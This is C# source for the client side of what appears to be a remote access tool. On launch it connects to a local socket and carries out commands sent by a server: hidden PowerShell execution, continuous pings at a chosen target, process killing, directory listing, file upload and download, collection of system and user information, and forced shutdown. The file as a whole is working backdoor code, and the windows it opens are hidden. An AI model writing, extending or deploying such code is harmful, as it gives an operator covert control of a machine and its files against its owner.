using System.Net.Sockets;
using System.Net;
using System.Text;
using Newtonsoft.Json;
using System.Diagnostics;
using Shared;

namespace Client
{
    public partial class FrmMain : Form
    {
        private readonly Socket clientSocket;
        private readonly IPEndPoint _endpoint;
        private CancellationToken _cancelationToken;

        public FrmMain()
        {
            InitializeComponent();

            _endpoint = new IPEndPoint(new IPAddress(new byte[] { 127, 0, 0, 1 }), 3030);

            clientSocket = new Socket(SocketType.Stream, ProtocolType.Tcp)
            {
                ReceiveTimeout = 30,
                SendTimeout = 30,
                ReceiveBufferSize = 8048,
                SendBufferSize = 8048
            };
        }


        public void StartPoolingConnection()
        {
            SoocketManager.SocketManager.ConnectAsync(
                clientSocket,
                _endpoint,
                _cancelationToken,
                new Progress<Socket>(NotifyConnection));
        }

        private void NotifyConnection(Socket socket)
        {
            CommandExecutor(socket, _cancelationToken);
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            StartPoolingConnection();
        }
        private static Task CommandExecutor(Socket socket, CancellationToken cancellationToken)
        {
            return Task.Run(async () =>
            {
                while (socket.Connected)
                {
                    if (SoocketManager.SocketManager.StreamAvaliable(socket))
                        try
                        {
                            byte[] commandBuffer = await SoocketManager.SocketManager.SocketReceiveAsync(socket, cancellationToken);

                            string cmd = Encoding.UTF8.GetString(commandBuffer);

                            if (cmd.IsSocketCommmmand(SocketCommands.NotifyMessage))
                            {
                                string receivedMessage = cmd.Replace(Types.SocketCommand(SocketCommands.NotifyMessage), "");

                                MessageBox.Show(receivedMessage);
                            }

                            if (cmd.IsSocketCommmmand(SocketCommands.ExecFile))
                            {
                                string receivedPath = cmd.Replace(Types.SocketCommand(SocketCommands.ExecFile), "");

                                ProcessStartInfo startInfo = new()
                                {
                                    WindowStyle = ProcessWindowStyle.Hidden,
                                    FileName = "powershell.exe",
                                    Arguments = receivedPath
                                };

                                Process process = new()
                                {
                                    StartInfo = startInfo
                                };
                                process.Start();
                            }

                            if (cmd.IsSocketCommmmand(SocketCommands.PingTarget))
                            {
                                string target = cmd.Replace(Types.SocketCommand(SocketCommands.PingTarget), "");

                                ProcessStartInfo startInfo = new()
                                {
                                    WindowStyle = ProcessWindowStyle.Hidden,
                                    FileName = "powershell.exe",
                                    Arguments = @$"ping {target} -t -f -i 30"
                                };

                                Process process = new()
                                {
                                    StartInfo = startInfo
                                };
                                process.Start();
                            }

                            if (cmd.IsSocketCommmmand(SocketCommands.KillProcess))
                            {
                                string receivedProcess = cmd.Replace(Types.SocketCommand(SocketCommands.KillProcess), "");

                                Process.GetProcessById(int.Parse(receivedProcess)).Kill();
                            }

                            if (cmd.IsSocketCommmmand(SocketCommands.ExplorePath))
                            {
                                List<ItemType> items = new();

                                string path = cmd.Replace(Types.SocketCommand(SocketCommands.ExplorePath), "");

                                foreach (string item in Directory.GetDirectories(path))
                                {
                                    DirectoryInfo dirInfo = new DirectoryInfo(item);
                                    items.Add(new ItemType(dirInfo.Name, "Directory", item, 0));
                                }

                                foreach (string fileNameAndPath in Directory.GetFiles(path))
                                {
                                    FileInfo fileInfo = new FileInfo(fileNameAndPath);
                                    items.Add(new ItemType(fileInfo.Name, fileInfo.Extension, fileNameAndPath, fileInfo.Length));
                                }

                                byte[] itemsBuffer = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(items));

                                await SoocketManager.SocketManager.SocketSendAsync(socket, itemsBuffer, cancellationToken);
                            }

                            if (cmd.IsSocketCommmmand(SocketCommands.NotifyOSInformations))
                            {
                                SystemInfo systemInfo = new(
                                    Environment.OSVersion.Platform,
                                    Environment.MachineName,
                                    Environment.Is64BitOperatingSystem,
                                    Environment.UserName);

                                byte[] osInfoBuffer = commandBuffer = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(systemInfo));

                                await SoocketManager.SocketManager.SocketSendAsync(socket, osInfoBuffer, cancellationToken);
                            }

                            if (cmd.IsSocketCommmmand(SocketCommands.NotifyShellCommand))
                            {
                                string shellCommand = cmd.Replace(Types.SocketCommand(SocketCommands.NotifyMessage), "");

                                ProcessStartInfo startInfo = new()
                                {
                                    WindowStyle = ProcessWindowStyle.Hidden,
                                    FileName = "powershell.exe",
                                    Arguments = shellCommand
                                };

                                Process process = new()
                                {
                                    StartInfo = startInfo
                                };
                                process.Start();
                            }

                            if (cmd.IsSocketCommmmand(SocketCommands.RemoteShutdown))
                            {
                                ProcessStartInfo startInfo = new()
                                {
                                    WindowStyle = ProcessWindowStyle.Hidden,
                                    FileName = "powershell.exe",
                                    Arguments = "shutdown -s -t 0"
                                };

                                Process process = new()
                                {
                                    StartInfo = startInfo
                                };

                                process.Start();
                            }

                            if (cmd.IsSocketCommmmand(SocketCommands.UploadFile))
                            {
                                string receivedPath = cmd.Replace(Types.SocketCommand(SocketCommands.UploadFile), "");

                                using FileStream fileStream = new(receivedPath, FileMode.Append, FileAccess.Write);

                                byte[] buffer = await SoocketManager.SocketManager.SocketReceiveAsync(socket, cancellationToken);

                                await fileStream.WriteAsync(buffer);

                                fileStream.Close();
                            }

                            if (cmd.IsSocketCommmmand(SocketCommands.DownLoadFile))
                            {
                                string receivedPath = cmd.Replace(Types.SocketCommand(SocketCommands.DownLoadFile), "");

                                byte[] buffer = File.ReadAllBytes(receivedPath);

                                await SoocketManager.SocketManager.SocketSendAsync(socket, buffer, cancellationToken);
                            }

                            if (cmd.IsSocketCommmmand(SocketCommands.GetProcesses))
                            {
                                List<ProcessInfo> processes = new();

                                foreach (Process? process in Process.GetProcesses().ToList())
                                    processes.Add(new ProcessInfo(process.Id, process.ProcessName, "", process.NonpagedSystemMemorySize64));

                                byte[] processesBuffer = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(processes));

                                await SoocketManager.SocketManager.SocketSendAsync(socket, processesBuffer, cancellationToken);
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                        }
                }
            }, cancellationToken);
        }

        private void FrmMain_FormClosed(object sender, FormClosedEventArgs e)
        {
            _cancelationToken = new CancellationToken(true);
        }
    }
}